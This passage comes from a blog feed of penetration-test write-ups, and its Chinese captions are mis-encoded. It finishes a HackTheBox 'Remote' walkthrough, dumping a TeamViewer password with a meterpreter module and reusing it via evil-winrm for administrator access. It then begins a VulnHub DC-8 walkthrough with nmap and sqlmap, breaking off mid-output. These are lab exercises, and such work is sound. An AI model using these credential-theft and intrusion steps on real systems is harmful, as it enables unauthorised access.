class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Videos</span><br><span class="line">               1 File(s)             34 bytes</span><br><span class="line">               7 Dir(s)  19,406,798,848 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Public&gt;<span class="built_in">type</span> user.txt</span><br><span class="line"><span class="built_in">type</span> user.txt</span><br><span class="line">****************************</span><br><span class="line"></span><br><span class="line">C:\Users\Public&gt;</span><br></pre></td></tr></table></figure><h2 id="0x09-ææƒ"><a href="#0x09-ææƒ" class="headerlink" title="0x09.ææƒ"></a>0x09.ææƒ</h2><p><code>æŸ¥çœ‹è½¯ä»¶ç›®å½•ï¼Œå‘ç°å®‰è£…äº†teamviewer</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;<span class="built_in">cd</span> program files</span><br><span class="line"><span class="built_in">cd</span> program files</span><br><span class="line"></span><br><span class="line">C:\Program Files&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE23-EB3E</span><br><span class="line"></span><br><span class="line"> Directory of C:\Program Files</span><br><span class="line"></span><br><span class="line">02/23/2020  03:19 PM    &lt;DIR&gt;          .</span><br><span class="line">02/23/2020  03:19 PM    &lt;DIR&gt;          ..</span><br><span class="line">02/19/2020  04:04 PM    &lt;DIR&gt;          Common Files</span><br><span class="line">09/15/2018  05:06 AM    &lt;DIR&gt;          internet explorer</span><br><span class="line">02/23/2020  03:16 PM    &lt;DIR&gt;          Microsoft SQL Server</span><br><span class="line">02/19/2020  04:11 PM    &lt;DIR&gt;          MSBuild</span><br><span class="line">02/19/2020  04:11 PM    &lt;DIR&gt;          Reference Assemblies</span><br><span class="line">02/19/2020  04:04 PM    &lt;DIR&gt;          VMware</span><br><span class="line">02/20/2020  07:46 AM    &lt;DIR&gt;          Windows Defender</span><br><span class="line">09/15/2018  05:05 AM    &lt;DIR&gt;          Windows Defender Advanced Threat Protection</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Mail</span><br><span class="line">10/29/2018  06:39 PM    &lt;DIR&gt;          Windows Media Player</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Multimedia Platform</span><br><span class="line">09/15/2018  03:28 AM    &lt;DIR&gt;          windows nt</span><br><span class="line">10/29/2018  06:39 PM    &lt;DIR&gt;          Windows Photo Viewer</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Portable Devices</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Security</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          WindowsPowerShell</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">              18 Dir(s)  19,407,548,416 bytes free</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">cd</span> program files (x86)</span><br><span class="line"><span class="built_in">cd</span> program files (x86)</span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE23-EB3E</span><br><span class="line"></span><br><span class="line"> Directory of C:\Program Files (x86)</span><br><span class="line"></span><br><span class="line">02/23/2020  03:19 PM    &lt;DIR&gt;          .</span><br><span class="line">02/23/2020  03:19 PM    &lt;DIR&gt;          ..</span><br><span class="line">09/15/2018  03:28 AM    &lt;DIR&gt;          Common Files</span><br><span class="line">09/15/2018  05:06 AM    &lt;DIR&gt;          Internet Explorer</span><br><span class="line">02/23/2020  03:19 PM    &lt;DIR&gt;          Microsoft SQL Server</span><br><span class="line">02/23/2020  03:15 PM    &lt;DIR&gt;          Microsoft.NET</span><br><span class="line">02/19/2020  04:11 PM    &lt;DIR&gt;          MSBuild</span><br><span class="line">02/19/2020  04:11 PM    &lt;DIR&gt;          Reference Assemblies</span><br><span class="line">02/20/2020  03:14 AM    &lt;DIR&gt;          TeamViewer</span><br><span class="line">09/15/2018  05:05 AM    &lt;DIR&gt;          Windows Defender</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Mail</span><br><span class="line">10/29/2018  06:39 PM    &lt;DIR&gt;          Windows Media Player</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Multimedia Platform</span><br><span class="line">09/15/2018  03:28 AM    &lt;DIR&gt;          windows nt</span><br><span class="line">10/29/2018  06:39 PM    &lt;DIR&gt;          Windows Photo Viewer</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Portable Devices</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          WindowsPowerShell</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">              17 Dir(s)  19,407,241,216 bytes free</span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)&gt;</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹teamviewerç‰ˆæœ¬ï¼Œç»“æœä¸ºv7</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files (x86)&gt;<span class="built_in">cd</span> teamviewer</span><br><span class="line"><span class="built_in">cd</span> teamviewer</span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\TeamViewer&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE23-EB3E</span><br><span class="line"></span><br><span class="line"> Directory of C:\Program Files (x86)\TeamViewer</span><br><span class="line"></span><br><span class="line">02/20/2020  03:14 AM    &lt;DIR&gt;          .</span><br><span class="line">02/20/2020  03:14 AM    &lt;DIR&gt;          ..</span><br><span class="line">02/27/2020  11:35 AM    &lt;DIR&gt;          Version7</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               3 Dir(s)  19,405,176,832 bytes free</span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\TeamViewer&gt;</span><br></pre></td></tr></table></figure><p><code>msfç ´è§£teamviewerå¯†ç ï¼Œå¯†ç ä¸º!R3m0te!</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/credentials/teamviewer_passwords</span><br><span class="line"></span><br><span class="line">[*] Finding TeamViewer Passwords on REMOTE</span><br><span class="line">[+] Found Unattended Password: !R3m0te!</span><br><span class="line">[+] Passwords stored <span class="keyword">in</span>: /root/.msf4/loot/20200831110133_default_10.10.10.180_host.teamviewer__720435.txt</span><br><span class="line">[*] &lt;---------------- | Using Window Technique | ----------------&gt;</span><br><span class="line">[*] TeamViewer<span class="string">&#x27;s language setting options are &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">[*] TeamViewer&#x27;</span>s version is <span class="string">&#x27;&#x27;</span></span><br><span class="line">[-] Unable to find TeamViewer<span class="string">&#x27;s process</span></span><br><span class="line"><span class="string">meterpreter &gt;</span></span><br></pre></td></tr></table></figure><p><code>ä½¿ç”¨evil-winrmææƒ</code><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0hhY2twbGF5ZXJzL2V2aWwtd2lucm0=">expåœ°å€<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/remote<span class="comment"># proxychains gem install winrm winrm-fs stringio</span></span><br><span class="line">root@JIYE:~/htb/remote<span class="comment"># git clone https://github.com/Hackplayers/evil-winrm.git</span></span><br><span class="line">æ­£å…‹éš†åˆ° <span class="string">&#x27;evil-winrm&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 22, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (22/22), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (16/16), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 805 (delta 9), reused 17 (delta 6), pack-reused 783</span><br><span class="line">æ¥æ”¶å¯¹è±¡ä¸­: 100% (805/805), 1.96 MiB | 1.35 MiB/s, å®Œæˆ.</span><br><span class="line">å¤„ç† delta ä¸­: 100% (461/461), å®Œæˆ.</span><br><span class="line">root@JIYE:~/htb/remote<span class="comment"># ls</span></span><br><span class="line">demo.exe  evil-winrm  flag  nmap.CV  site_backups  Umbraco-RCE  user.txt</span><br><span class="line">root@JIYE:~/htb/remote<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹ç›¸å…³å‚æ•°</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]</span><br><span class="line">    -S, --ssl                        Enable ssl</span><br><span class="line">    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate</span><br><span class="line">    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate</span><br><span class="line">    -r, --realm DOMAIN               Kerberos auth, it has to be <span class="built_in">set</span> also <span class="keyword">in</span> /etc/krb5.conf file using this format -&gt; CONTOSO.COM = &#123; kdc = fooserver.contoso.com &#125;</span><br><span class="line">    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts <span class="built_in">local</span> path</span><br><span class="line">    -e, --executables EXES_PATH      C<span class="comment"># executables local path</span></span><br><span class="line">    -i, --ip IP                      Remote host IP or hostname (required)</span><br><span class="line">    -U, --url URL                    Remote url endpoint (default wsman)</span><br><span class="line">    -u, --user USER                  Username (required <span class="keyword">if</span> not using kerberos)</span><br><span class="line">    -p, --password PASS              Password</span><br><span class="line">    -H, --<span class="built_in">hash</span> NTHash                NTHash </span><br><span class="line">    -P, --port PORT                  Remote host port (default 5985)</span><br><span class="line">    -V, --version                    Show version</span><br><span class="line">    -n, --no-colors                  Disable colors</span><br><span class="line">    -h, --<span class="built_in">help</span>                       Display this <span class="built_in">help</span> message</span><br></pre></td></tr></table></figure><p><code>ææƒ</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/remote/evil-winrm<span class="comment"># ruby evil-winrm.rb -u &#x27;administrator&#x27; -p &#x27;!R3m0te!&#x27; -i &#x27;10.10.10.180&#x27;</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2.3</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cd</span>\</span><br><span class="line">*Evil-WinRM* PS C:\&gt; whoami</span><br><span class="line">remote\administrator</span><br></pre></td></tr></table></figure><p><code>æŸ¥æ‰¾root.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\users\administrator&gt; <span class="built_in">cd</span> desktop</span><br><span class="line">*Evil-WinRM* PS C:\users\administrator\desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\users\administrator\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-ar---        8/31/2020  10:33 AM             34 root.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\users\administrator\desktop&gt; <span class="built_in">type</span> root.txt</span><br><span class="line">*********************************************</span><br><span class="line">*Evil-WinRM* PS C:\users\administrator\desktop&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.ç®€è¿°&lt;/h2&gt;&lt;img src=&quot;/2020/08/31/HTB-remote/image-20200905171855936.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>DC-8</title>
    <link href="https://lunamoore.github.io/2020/08/31/DC-8/"/>
    <id>https://lunamoore.github.io/2020/08/31/DC-8/</id>
    <published>2020-08-31T03:01:01.000Z</published>
    <updated>2020-09-02T09:24:10.164Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å®˜ç½‘æè¿°"><a href="#0x00-å®˜ç½‘æè¿°" class="headerlink" title="0x00.å®˜ç½‘æè¿°"></a>0x00.å®˜ç½‘æè¿°</h2><blockquote><p>DC-8 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p><p>This challenge is a bit of a hybrid between being an actual challenge, and being a â€œproof of conceptâ€ as to whether two-factor authentication installed and configured on Linux can prevent the Linux server from being exploited.</p><p>The â€œproof of conceptâ€ portion of this challenge eventuated as a result of a question being asked about two-factor authentication and Linux on Twitter, and also due to a suggestion by @theart42.</p><p>The ultimate goal of this challenge is to bypass two-factor authentication, get root and to read the one and only flag.</p><p>You probably wouldnâ€™t even know that two-factor authentication was installed and configured unless you attempt to login via SSH, but itâ€™s definitely there and doing itâ€™s job.</p><p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p><p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I wonâ€™t give you the answer, instead, Iâ€™ll give you an idea about how to move forward.</p></blockquote><a id="more"></a><h2 id="0x01-è€è§„çŸ©nmap"><a href="#0x01-è€è§„çŸ©nmap" class="headerlink" title="0x01.è€è§„çŸ©nmap"></a>0x01.è€è§„çŸ©nmap</h2><p><code>å¯ä»¥å‘ç°1ä¸ºç½‘å…³ï¼Œ2ä¸ºå®¿ä¸»æœºï¼Œ6ä¸ºkaliï¼Œé‚£ä¹ˆ3å°±æ˜¯æˆ‘ä»¬çš„å—å®³è€…</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-30 20:37 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0029s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00051s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line">MAC Address: 00:0C:29:57:6A:A6 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.06 seconds</span><br><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"><a href="#0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£" class="headerlink" title="0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"></a>0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£</h2><p><code>å¯ä»¥å‘ç°å¼€æ”¾äº†22/80ç«¯å£ï¼Œä¸”Drupalçš„ç‰ˆæœ¬ä¸º7</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># nmap -sC -sV -v 192.168.1.3 -oN nmap.demo</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-30 20:38 EDT</span><br><span class="line">NSE: Loaded 151 scripts <span class="keyword">for</span> scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.00s elapsed</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.00s elapsed</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.00s elapsed</span><br><span class="line">Initiating ARP Ping Scan at 20:38</span><br><span class="line">Scanning 192.168.1.3 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 20:38, 0.03s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 20:38</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 20:38, 0.03s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 20:38</span><br><span class="line">Scanning 192.168.1.3 [1000 ports]</span><br><span class="line">Discovered open port 80/tcp on 192.168.1.3</span><br><span class="line">Discovered open port 22/tcp on 192.168.1.3</span><br><span class="line">Completed SYN Stealth Scan at 20:38, 0.08s elapsed (1000 total ports)</span><br><span class="line">Initiating Service scan at 20:38</span><br><span class="line">Scanning 2 services on 192.168.1.3</span><br><span class="line">Completed Service scan at 20:38, 6.71s elapsed (2 services on 1 host)</span><br><span class="line">NSE: Script scanning 192.168.1.3.</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 1.27s elapsed</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.02s elapsed</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.00s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.000092s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)</span><br><span class="line">|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)</span><br><span class="line">|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd</span><br><span class="line">|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Welcome to DC-8 | DC-8</span><br><span class="line">MAC Address: 00:0C:29:57:6A:A6 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.00s elapsed</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.00s elapsed</span><br><span class="line">Initiating NSE at 20:38</span><br><span class="line">Completed NSE at 20:38, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.75 seconds</span><br><span class="line">           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.036KB)</span><br><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x03-å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®"><a href="#0x03-å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®" class="headerlink" title="0x03.å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®"></a>0x03.å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®</h2><p><code>æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°å¯èƒ½å­˜åœ¨sqlæ³¨å…¥</code></p><img src="/2020/08/31/DC-8/image-20200831085455429.png" class><p><code>å°è¯•é—­åˆï¼Œå‘ç°æŠ¥é”™</code></p><img src="/2020/08/31/DC-8/image-20200831085553934.png" class><p><code>æŸ¥çœ‹robots.txtï¼Œå‘ç°æ›´æ–°æ—¥å¿—ä¸åå°ç™»å…¥åœ°å€</code></p><img src="/2020/08/31/DC-8/image-20200831093824769.png" class><h2 id="0x04-çˆ†åº“"><a href="#0x04-çˆ†åº“" class="headerlink" title="0x04.çˆ†åº“"></a>0x04.çˆ†åº“</h2><p><code>å‘ç°æ•°æ®åº“ä¸ºd7db</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># sqlmap -u &quot;http://192.168.1.3/?nid=2&quot; --dbs</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [,]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [&quot;]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 20:57:11 /2020-08-30/</span><br><span class="line"></span><br><span class="line">[20:57:11] [INFO] testing connection to the target URL</span><br><span class="line">[20:57:11] [INFO] checking <span class="keyword">if</span> the target is protected by some kind of WAF/IPS</span><br><span class="line">[20:57:11] [INFO] testing <span class="keyword">if</span> the target URL content is stable</span><br><span 